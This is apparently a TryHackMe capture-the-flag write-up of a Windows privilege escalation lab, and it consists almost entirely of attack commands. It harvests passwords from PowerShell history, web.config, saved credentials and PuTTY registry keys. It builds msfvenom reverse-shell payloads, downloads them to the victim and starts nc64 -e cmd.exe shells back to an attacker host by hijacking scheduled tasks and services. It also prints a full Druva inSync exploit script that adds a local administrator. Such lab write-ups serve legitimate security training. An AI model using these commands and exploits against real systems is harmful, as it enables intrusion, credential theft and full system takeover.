# Windows Privilege Escalation

**Room Link:** [https://tryhackme.com/room/windowsprivesc20](https://tryhackme.com/room/windowsprivesc20)



## Harvesting Passwords from Usual Spots

**A password for the julia.jones user has been left on the Powershell history. What is the password?**

**Victim(cmd)**

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<figure><img src="../../.gitbook/assets/image (6) (9).png" alt=""><figcaption></figcaption></figure>

**A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db\_admin user?**

**Victim(cmd)**

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

<figure><img src="../../.gitbook/assets/image (9) (2) (1).png" alt=""><figcaption></figcaption></figure>

**There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

**Victim(cmd)**

```
cmdkey /list
runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
```

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

**Victim(cmd)**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

## Other Quick Wins

**What is the taskusr1 flag?**

**Victim(cmd)**

```
schtasks /query /tn vulntask /fo list /v
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls c:\tasks\schtask.bat
```

**Victim(cmd)**

```
icacls c:\tasks\schtask.bat
```

<figure><img src="../../.gitbook/assets/image (20) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 4444
```

**Victim**

```
echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
schtasks /run /tn vulntask
```

<figure><img src="../../.gitbook/assets/image (30) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Abusing Service Misconfigurations

### Insecure Permissions on Service Executable

**Get the flag on svcusr1's desktop**

**Victim(cmd)**

```
sc qc WindowsScheduler
```

<figure><img src="../../.gitbook/assets/image (21) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4445 -f exe-service -o rev-svc.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://$KALI:81/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well.

**Victim(Powershell)**

```
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Kali**

```
nc -lvp 4445
```

**Note:** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

**Victim(cmd)**

```
sc stop windowsscheduler
sc start windowsscheduler
```

**OR**

**Victim(Powershell)**

```
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```

<figure><img src="../../.gitbook/assets/image (31) (2).png" alt=""><figcaption></figcaption></figure>

### Unquoted Service Paths





**Victim(cmd)**

```
 sc qc "disk sorter enterprise"
```

<figure><img src="../../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4446 -f exe-service -o rev-svc2.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://10.10.15.215:81/rev-svc2.exe -O rev-svc2.exe
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

**Kali**

```
nc -lvp 4446
```

**Victim(cmd)**

```
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```

<figure><img src="../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>

### Insecure Service Permissions

**Victim(cmd)**

```
cd C:\tools\AccessChk
accesschk64.exe -qlc thmservice
```

<figure><img src="../../.gitbook/assets/image (7) (8) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4447 -f exe-service -o rev-svc3.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://10.10.15.215:81/rev-svc3.exe -O rev-svc3.exe
```

**Kali**

```
nc -lvp 4447
```

**Victim(Powershell)**

```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc.exe stop THMService
sc.exe start THMService
```

<figure><img src="../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>

## Abusing dangerous privileges

<figure><img src="../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvp 4442
```

**Victim(Browser)**

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
```

<figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

## Abusing vulnerable software

### Case Study: Druva inSync 6.6.3

#### **Druva\_inSync\_exploit.ps1**

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

**Victim**

```
cd C:\tools\
.\Druva_inSync_exploit.ps1
```

<figure><img src="../../.gitbook/assets/image (28) (2).png" alt=""><figcaption></figcaption></figure>

**Victim(Powershell)**

```
runas /user:pwned "C:\Windows\system32\cmd.exe"
Enter the password for pwnd: SimplePass123
```

**Victim(cmd)**

```
powershell.exe -Command "Start-Process cmd "/k cd /d %cd%" -Verb RunAs"
```

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
